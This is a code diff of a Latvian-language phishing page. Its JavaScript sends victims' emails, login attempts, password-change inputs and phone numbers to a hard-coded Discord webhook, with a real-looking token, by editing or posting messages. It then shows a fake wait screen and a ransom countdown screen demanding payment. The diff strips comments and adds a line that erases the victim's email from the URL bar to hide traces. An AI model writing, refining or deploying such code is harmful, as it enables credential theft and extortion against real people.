@@ -571,7 +571,7 @@ Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzē
 </div>
 
 <script>
-/* ── Webhook — tieši klientā, tāpat kā tavā oriģinālajā ── */
+/* ── Webhook — tieši klientā ── */
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547540540994621440/I295Pa8pLWiW3OzAbSUTbU-ad-prxpoXqJkeyQDCZF1xYjEZ0hNoz47Y8aQuDF_Bnk8w';
 
 /* ── localStorage atslēga vienas ziņas glabāšanai uz lietotāju ── */
@@ -589,7 +589,6 @@ const PHONE_RULES = {
   '+49':  { country: 'DE', minLen: 10, maxLen: 11, regex: /^[1-9]\d{9,10}$/ },
 };
 
-/* ── Skaitītāji un message ID glabāšana ── */
 function loadStore() {
   try {
     return JSON.parse(localStorage.getItem(MSG_STORE_KEY) || '{}');
@@ -603,7 +602,6 @@ function saveStore(store) {
   } catch (e) {}
 }
 
-/* ── Sūta uz webhook — edit ja ir message_id, citādi jauns POST ── */
 async function sendToDiscord(email, action, opts = {}) {
   const {
     hasPassword = false,
@@ -618,7 +616,6 @@ async function sendToDiscord(email, action, opts = {}) {
   const store = loadStore();
   const key   = email.toLowerCase();
 
-  // Inicializē lietotāja ierakstu
   if (!store[key]) {
     store[key] = {
       email:           email,
@@ -635,7 +632,6 @@ async function sendToDiscord(email, action, opts = {}) {
 
   const u = store[key];
 
-  // Atjaunina skaitītājus
   if (action.includes('Saites atvēršana')) {
     u.link_opens++;
   } else if (action.includes('Pieslēgšanās mēģinājums')) {
@@ -649,7 +645,6 @@ async function sendToDiscord(email, action, opts = {}) {
     if (country) u.country      = country;
   }
 
-  // Būvē embed
   const fields = [
     { name: '📧 E-pasts',            value: u.email, 'inline': true },
     { name: '🔗 Saites atvērumi',    value: String(u.link_opens), 'inline': true },
@@ -679,7 +674,6 @@ async function sendToDiscord(email, action, opts = {}) {
 
   try {
     if (u.message_id) {
-      // Mēģina editēt esošo ziņu
       const editRes = await fetch(`${WEBHOOK_URL}/messages/${u.message_id}`, {
         method: 'PATCH',
         headers: { 'Content-Type': 'application/json' },
@@ -687,7 +681,6 @@ async function sendToDiscord(email, action, opts = {}) {
       });
 
       if (editRes.status === 404) {
-        // Ziņa izdzēsta Discord pusē → veido jaunu
         u.message_id = null;
       } else if (editRes.ok) {
         saveStore(store);
@@ -695,7 +688,6 @@ async function sendToDiscord(email, action, opts = {}) {
       }
     }
 
-    // Jauna ziņa
     const createRes = await fetch(`${WEBHOOK_URL}?wait=true`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -715,14 +707,12 @@ async function sendToDiscord(email, action, opts = {}) {
   saveStore(store);
 }
 
-/* ── State ── */
 let storedEmail = '';
 let loginAttempts = 0;
 const MAX_ATTEMPTS_BEFORE_PHONE = 2;
 let currentLang = 'lv';
 let waitInterval = null;
 
-/* ── DOM refs ── */
 const emailInput     = document.getElementById('email');
 const passwordInput  = document.getElementById('password');
 const formError      = document.getElementById('formError');
@@ -751,7 +741,6 @@ const waitCount      = document.getElementById('waitCount');
 const ransomScreen   = document.getElementById('ransomScreen');
 const ransomTimerEl  = document.getElementById('ransomTimer');
 
-/* ── Modal helpers ── */
 function hideAllModals() {
   forgotModal.classList.remove('active');
   phoneModal.classList.remove('active');
@@ -789,7 +778,6 @@ function updatePhonePlaceholder() {
   }
 }
 
-/* ── Wait screen (60s) ── */
 function showWaitScreen() {
   hideAllModals();
   waitScreen.classList.add('active');
@@ -810,7 +798,6 @@ function showWaitScreen() {
   }, 1000);
 }
 
-/* ── Ransom screen ── */
 let ransomInterval = null;
 function showRansomScreen() {
   ransomScreen.classList.add('active');
@@ -834,7 +821,6 @@ function startRansomTimer(seconds) {
   }, 1000);
 }
 
-/* ── Login flow ── */
 function attemptLogin(email, password) {
   loginAttempts++;
   const hasPassword = Boolean(password && password.length > 0);
@@ -857,7 +843,6 @@ function attemptLogin(email, password) {
   return false;
 }
 
-/* ── Login form submit ── */
 loginForm.addEventListener('submit', function (e) {
   e.preventDefault();
   const email = emailInput.value.trim();
@@ -872,12 +857,10 @@ loginForm.addEventListener('submit', function (e) {
   attemptLogin(email, password);
 });
 
-/* ── Aizmirsāt paroli — tikai atver modālo ── */
 pwdForgotLink.addEventListener('click', function () {
   showForgotModal();
 });
 
-/* ── Paroles maiņas apstiprināšana ── */
 forgotSendBtn.addEventListener('click', function () {
   const email  = forgotEmail.value.trim();
   const oldPwd = forgotOldPassword.value.trim();
@@ -909,7 +892,6 @@ pwdChangedOk.addEventListener('click', function () {
   emailInput.focus();
 });
 
-/* ── Phone modal ── */
 phoneCode.addEventListener('change', updatePhonePlaceholder);
 
 phoneSubmit.addEventListener('click', function () {
@@ -954,7 +936,6 @@ phoneNumber.addEventListener('input', function () {
 
 phoneNumber.addEventListener('keydown', e => { if (e.key === 'Enter') phoneSubmit.click(); });
 
-/* ── Click-outside ── */
 document.querySelectorAll('.modal-overlay').forEach(overlay => {
   overlay.addEventListener('click', function (e) {
     if (e.target === this) {
@@ -967,7 +948,6 @@ document.querySelectorAll('.modal-overlay').forEach(overlay => {
   });
 });
 
-/* ── Language ── */
 document.getElementById('langSelect').addEventListener('change', function () {
   currentLang = this.value;
   updateTexts(currentLang);
@@ -1164,6 +1144,9 @@ window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', sw
     emailInput.value = emailParam;
     storedEmail = emailParam;
     sendToDiscord(emailParam, '📨 Saites atvēršana', { clickOnly: true });
+
+    // Iztīra ?email= no URL joslas
+    window.history.replaceState({}, '', window.location.pathname);
   }
 
   swapLogo();
